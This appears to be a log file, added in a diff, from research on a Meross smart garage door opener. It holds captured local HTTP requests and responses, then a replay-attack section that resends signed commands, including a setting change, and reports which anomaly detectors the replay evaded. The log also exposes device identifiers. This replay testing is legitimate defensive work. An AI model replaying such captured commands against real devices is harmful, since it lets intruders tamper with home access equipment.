@@ -1,0 +1,273 @@
+{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 310
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"9ee708f18ba97dfc8d66915c30774590","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"0baece04059aee6070180762faacac69","timestamp":1694935577,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"9ee708f18ba97dfc8d66915c30774590","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935578,"timestampMs":507,"sign":"a8fa1efb47262fa47b679c2b0fbb9d9e"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1694935578,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 313
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"9c8d66b6720b80e0b9bd45d0be343cbf","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"66c698f0bd101178e45435c08320613e","timestamp":1694935577,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"9c8d66b6720b80e0b9bd45d0be343cbf","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935578,"timestampMs":602,"sign":"176dcf9eaecea8603c4500f44ea11d96"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}
+
+{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
+{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
+{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
+{"devName":"msg100","devSoftWare":"4.2.6","devHardWare":"4.0.0","ip":"10.13.0.32","port":80,"mac":"48:e1:e9:ab:ec:1b","uuid":"2210197269145761070248e1e9abec1b","deviceType":"msg100","subType":"us"}
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 317
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"b37e6e218ea76cf7524978b8ef0b33b5","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"ec8f93b2c6f615fdf716d1108fac4f75","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 313
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"274aeb6d7164260d4fb3356fd0c6b15c","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"9452447001695d3b7f354e7bd1454c60","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 314
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"edcf6de333f47837c278fc5cdba3f8a2","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"dacb776e8cc2cf1870ac2c888e7fe860","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"b37e6e218ea76cf7524978b8ef0b33b5","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935586,"timestampMs":126,"sign":"27d8fdad8c3d71c1c2149172a9fd14c2"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}
+
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 317
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"976d7d7b404c3024b995fe16cd75c296","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"231224823ba48053d91e2604adf5af96","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"274aeb6d7164260d4fb3356fd0c6b15c","namespace":"Appliance.Digest.TimerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935586,"timestampMs":138,"sign":"8c0552f26d82948b1f3e5971a9c59f43"},"payload":{"digest":[]}}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"edcf6de333f47837c278fc5cdba3f8a2","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935586,"timestampMs":146,"sign":"0792153ad86cc1782e073b30922fb15f"},"payload":{"DNDMode":{"mode":1}}}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"976d7d7b404c3024b995fe16cd75c296","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935586,"timestampMs":155,"sign":"8d4f8f776e2158bfcf501b0c068a017b"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}
+
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 315
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"1b58c637712584b04a5c71118c83070e","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"c570fe02f7f0d7ad3e7087cb7c5dc577","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"1b58c637712584b04a5c71118c83070e","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935586,"timestampMs":231,"sign":"5b540b27fb838d77a50c1b8e0ff9818c"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}
+
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 314
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"ed01892eb1646c252a4feeb673d700fc","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"4f7e5bf315966a688b5e6e425005b3e4","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"ed01892eb1646c252a4feeb673d700fc","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935586,"timestampMs":561,"sign":"20feccc5163ea6b01d139af7a6e49db8"},"payload":{"runtime":{"signal":100}}}
+
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 334
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"2a9d8db6759b420b8202c56192eaa631","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"0a170df708d93e1ad10c6ca197076d3c","timestamp":1694935589,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"2a9d8db6759b420b8202c56192eaa631","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935590,"timestampMs":28,"sign":"e7b171b90b55b92e33b7af8153f3444a"},"payload":{}}
+
+START REPLAY ATTACK
+#######################################################################################
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 334
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"2a9d8db6759b420b8202c56192eaa631","method":"SET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"0a170df708d93e1ad10c6ca197076d3c","timestamp":1694935589,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{"DNDMode":{"mode":0}}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"2a9d8db6759b420b8202c56192eaa631","namespace":"Appliance.System.DNDMode","triggerSrc":"AndroidLocal","method":"SETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":346,"sign":"c0e7d714c946faa692380e28b7f6930a"},"payload":{}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 314
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"ed01892eb1646c252a4feeb673d700fc","method":"GET","namespace":"Appliance.System.Runtime","payloadVersion":1,"sign":"4f7e5bf315966a688b5e6e425005b3e4","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"ed01892eb1646c252a4feeb673d700fc","namespace":"Appliance.System.Runtime","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":359,"sign":"f3ed5fee022c251cd596d18c3014e1f4"},"payload":{"runtime":{"signal":100}}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 315
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"1b58c637712584b04a5c71118c83070e","method":"GET","namespace":"Appliance.Digest.TriggerX","payloadVersion":1,"sign":"c570fe02f7f0d7ad3e7087cb7c5dc577","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"1b58c637712584b04a5c71118c83070e","namespace":"Appliance.Digest.TriggerX","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":370,"sign":"6787f0ec3286879fc085bbb42766f95f"},"payload":{"digest":[{"channel":0,"id":"1111111111111111","count":1}]}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 317
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"976d7d7b404c3024b995fe16cd75c296","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"231224823ba48053d91e2604adf5af96","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"976d7d7b404c3024b995fe16cd75c296","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":383,"sign":"a704cff86c14d57d6d9ee90e63e0b015"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 317
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"b37e6e218ea76cf7524978b8ef0b33b5","method":"GET","namespace":"Appliance.GarageDoor.Config","payloadVersion":1,"sign":"ec8f93b2c6f615fdf716d1108fac4f75","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"b37e6e218ea76cf7524978b8ef0b33b5","namespace":"Appliance.GarageDoor.Config","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":394,"sign":"6ebda616484314a19845b32ec1fdb0c2"},"payload":{"config":{"signalDuration":2000,"buzzerEnable":0,"doorOpenDuration":5000,"doorCloseDuration":5000}}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 313
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"274aeb6d7164260d4fb3356fd0c6b15c","method":"GET","namespace":"Appliance.Digest.TimerX","payloadVersion":1,"sign":"9452447001695d3b7f354e7bd1454c60","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 314
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"edcf6de333f47837c278fc5cdba3f8a2","method":"GET","namespace":"Appliance.System.DNDMode","payloadVersion":1,"sign":"dacb776e8cc2cf1870ac2c888e7fe860","timestamp":1694935584,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 313
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"9c8d66b6720b80e0b9bd45d0be343cbf","method":"GET","namespace":"Appliance.System.Online","payloadVersion":1,"sign":"66c698f0bd101178e45435c08320613e","timestamp":1694935577,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"9c8d66b6720b80e0b9bd45d0be343cbf","namespace":"Appliance.System.Online","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":410,"sign":"718f8792418b7e07ed87ff73e28b7c22"},"payload":{"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 310
+Host: 10.13.0.32
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.13.0.32/config","messageId":"9ee708f18ba97dfc8d66915c30774590","method":"GET","namespace":"Appliance.System.All","payloadVersion":1,"sign":"0baece04059aee6070180762faacac69","timestamp":1694935577,"triggerSrc":"AndroidLocal","uuid":"2210197269145761070248e1e9abec1b"},"payload":{}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"9ee708f18ba97dfc8d66915c30774590","namespace":"Appliance.System.All","triggerSrc":"AndroidLocal","method":"GETACK","payloadVersion":1,"from":"/appliance/2210197269145761070248e1e9abec1b/publish","timestamp":1694935711,"timestampMs":420,"sign":"7a8e5129e06e764dd6e2bc15d6677a7c"},"payload":{"all":{"system":{"hardware":{"type":"msg100","subType":"us","version":"4.0.0","chipType":"MT7686","uuid":"2210197269145761070248e1e9abec1b","macAddress":"48:e1:e9:ab:ec:1b"},"firmware":{"version":"4.2.6","homekitVersion":"2.0.1","compileTime":"Oct 24 2022 10:28:41","encrypt":1,"wifiMac":"28:e3:47:c2:d9:cc","innerIp":"10.13.0.32","server":"mqtt-us-2.meross.com","port":443,"userId":3094003},"time":{"timestamp":1694935711,"timezone":"Europe/Rome","timeRule":[[1679792400,7200,1],[1698541200,3600,0],[1711846800,7200,1],[1729990800,3600,0],[1743296400,7200,1],[1761440400,3600,0],[1774746000,7200,1],[1792890000,3600,0],[1806195600,7200,1],[1824944400,3600,0],[1837645200,7200,1],[1856394000,3600,0],[1869094800,7200,1],[1887843600,3600,0],[1901149200,7200,1],[1919293200,3600,0],[1932598800,7200,1],[1950742800,3600,0],[1964048400,7200,1],[1982797200,3600,0]]},"online":{"status":1,"bindId":"U8dHQ2wouexxfAA0","who":1}},"digest":{"togglex":[{"channel":0,"onoff":0,"lmTime":0}],"triggerx":[{"channel":0,"id":"1111111111111111","count":1}],"timerx":[],"garageDoor":[{"channel":0,"open":1,"lmTime":
+****************************************************************
+REPLAY ATTACK NOT SUCCESSFUL WITH CLF=OneClassSVM(gamma='auto', nu=0.001)
+REPLAY ATTACK SUCCESSFUL WITH CLF=IsolationForest(contamination=0.01)
+REPLAY ATTACK SUCCESSFUL WITH CLF=EllipticEnvelope(contamination=0.01)
+REPLAY ATTACK SUCCESSFUL WITH CLF=LocalOutlierFactor(contamination=0.01, novelty=True)
+REPLAY ATTACK SUCCESSFUL WITH CLF=CustomClassifier()
+END REPLAY ATTACK
